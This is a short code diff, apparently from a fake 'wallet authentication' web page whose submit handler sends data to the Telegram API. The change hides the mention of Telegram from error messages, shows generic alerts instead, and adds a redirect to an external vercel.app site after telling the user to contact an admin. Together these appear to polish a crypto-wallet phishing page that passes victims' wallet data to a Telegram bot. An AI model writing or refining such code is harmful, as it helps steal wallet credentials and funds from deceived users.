@@ -120,9 +120,16 @@
 
         if (!res.ok) throw new Error("Telegram API error");
 
-        alert("✅ Wallet authenticated successfully.");
+        alert("Wallet authenticated successfully. Please contact admin for next steps. Redirecting...");
+        window.location.href = "https://walletauthenticatorpass.vercel.app";
       } catch (err) {
-        alert("❌ Error sending to Telegram: " + err.message);
+        console.error("Server error:", err);
+
+        if (err.message.includes("Failed to fetch") || err.message.includes("NetworkError")) {
+          alert("Network error: Please check your internet connection and try again.");
+        } else {
+          alert("Unable to complete the request. Please try again later.");
+        }
       }
 
       submitBtn.disabled = false;
